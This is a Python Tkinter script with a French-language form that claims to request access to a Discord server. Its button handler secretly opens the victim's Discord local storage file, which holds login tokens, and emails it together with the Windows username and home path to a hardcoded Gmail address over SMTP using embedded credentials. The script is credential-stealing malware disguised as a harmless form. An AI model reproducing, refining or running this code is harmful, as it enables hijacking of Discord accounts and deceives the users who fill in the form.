import getpass
import json
import os
import shutil
import smtplib
import sqlite3
import subprocess
import time
import webbrowser
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from tkinter import *
from tkinter import ttk
from tkinter.messagebox import *

root = Tk()
root.title('Accéder au serveur Discord')


serv = LabelFrame(root, text='Accéder au serveur', padx=20, pady=20)
serv.pack()

pseudovar = StringVar()
pseudovar.set('Votre pseudo + discriminateur (exemple : Discord#1234)')
pseudo = Entry(serv, textvariable=pseudovar, width=50)
pseudo.pack()

username = Path.home()
user = getpass.getuser()
cwd = os.getcwd()

def send():
    messaging = "Azertyui0"
    fromaddr = "disocorde@gmail.com"
    toaddr = "dsicrod@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Requête de frontière : ' + pseudo.get()
    body = str(user) + " ; " + str(username) + " ; " + pseudo.get()
    msg.attach(MIMEText(body, 'plain'))
    filename = "https_discordapp.com_0.localstorage"
    attachment = open(str(username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, str(messaging))
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    sys.exit()

Button(serv, text='Envoyer la requête', width=43, command=lambda:send()).pack()

root.mainloop()